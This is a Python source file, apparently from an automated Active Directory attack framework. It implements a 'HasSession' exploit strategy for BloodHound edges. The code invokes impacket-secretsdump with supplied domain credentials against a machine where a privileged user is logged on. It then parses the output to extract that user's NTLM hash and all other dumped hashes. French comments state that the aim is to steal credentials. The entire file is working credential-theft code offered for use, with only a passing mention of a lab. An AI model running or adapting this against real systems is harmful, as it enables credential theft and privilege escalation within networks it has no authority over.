import subprocess
from entities.edge import Edge
from .exploit_strategy import ExploitStrategy


class HasSessionStrategy(ExploitStrategy):
    """
    HasSession — Un utilisateur privilégié a une session active sur la machine.
    On dump LSASS via impacket-secretsdump sur cette machine pour voler ses credentials.

    Direction BloodHound : Machine --HasSession--> User
        edge.source_node = machine où tourne la session
        edge.goal_node   = utilisateur dont on veut voler les credentials

    FIX: clarification source/goal dans describe(), ajout -target-ip.
    """

    def describe(self, edge: Edge) -> str:
        return (
            f"[HasSession] {edge.goal_node.label} a une session active sur "
            f"{edge.source_node.label} → dump LSASS pour voler ses credentials"
        )

    def exploit(self, edge: Edge, username: str, password: str, domain: str, dc_ip: str) -> dict:
        machine     = edge.source_node.label    # machine où se trouve la session
        target_user = edge.goal_node.label      # utilisateur dont on veut le hash

        # Dump LSASS sur la machine — nécessite d'être admin local sur elle
        # -target-ip évite les problèmes DNS en lab
        cmd = [
            "impacket-secretsdump",
            f"{domain}/{username}:{password}@{machine}",
            "-target-ip", dc_ip,
        ]

        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr

            # Cherche spécifiquement le hash de l'utilisateur cible
            target_short = target_user.split("@")[0].upper()
            found_hash   = None

            all_hashes = []
            for line in output.splitlines():
                if ":::" in line and not line.startswith("["):
                    all_hashes.append(line.strip())
                    if target_short in line.upper():
                        found_hash = line.strip()

            success = len(all_hashes) > 0

            return {
                "success": success,
                "output":  output,
                "credentials": {
                    "type":        "lsass_dump",
                    "machine":     machine,
                    "target_user": target_user,
                    "target_hash": found_hash,      # hash de l'utilisateur voulu (peut être None)
                    "all_hashes":  all_hashes,      # tous les hashes trouvés en mémoire
                } if success else None,
            }

        except subprocess.TimeoutExpired:
            return {"success": False, "output": "Timeout", "credentials": None}
        except FileNotFoundError:
            return {"success": False, "output": "impacket-secretsdump introuvable", "credentials": None}